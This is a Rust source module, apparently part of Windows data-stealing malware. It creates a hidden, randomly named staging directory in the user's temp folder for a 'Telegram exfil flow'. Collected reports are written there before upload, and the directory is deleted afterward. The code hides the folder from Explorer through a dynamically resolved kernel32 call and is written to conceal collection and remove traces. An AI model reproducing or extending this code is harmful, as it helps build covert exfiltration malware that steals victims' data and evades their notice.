//! Disposable working directory for the Telegram exfil flow (wave 7).
//!
//! When the CLI is told to deliver a report but no `-d` output dir was given,
//! `run_dump` writes into a throwaway directory here instead of the results
//! folder next to the exe. The directory lives under the user's temp dir, gets
//! a random-ish non-guessable name and the `FILE_ATTRIBUTE_HIDDEN` flag, and —
//! unlike a real `-d results` run — the caller removes it after the push.

use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::path::PathBuf;

use windows::core::PCWSTR;

use crate::apitable::kernel32;

/// `FILE_ATTRIBUTE_HIDDEN` — the flag that makes Explorer skip the folder.
const FILE_ATTRIBUTE_HIDDEN: u32 = 0x2;

/// Create `<temp>\<label>_<pid>_<nanos>.tmp` with the HIDDEN attribute.
///
/// Returns `None` if the dir can't be created or the attribute can't be set —
/// the CLI then falls back to its normal `-d` dir rather than failing the run.
pub fn hidden_temp_dir(label: &str) -> Option<PathBuf> {
    let stamp = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .ok()?
        .as_nanos();
    let name = format!("{label}_{}_{:032x}.tmp", std::process::id(), stamp);
    let dir = std::env::temp_dir().join(name);
    std::fs::create_dir_all(&dir).ok()?;

    let wide: Vec<u16> = OsStr::new(&dir)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();
    // SAFETY: NUL-terminated UTF-16 path; marking the dir hidden is best-effort
    // (a failure to set the attribute leaves a visible temp dir, not a broken run).
    unsafe {
        let _ = (kernel32().set_file_attributes_w)(PCWSTR(wide.as_ptr()), FILE_ATTRIBUTE_HIDDEN);
    }
    Some(dir)
}
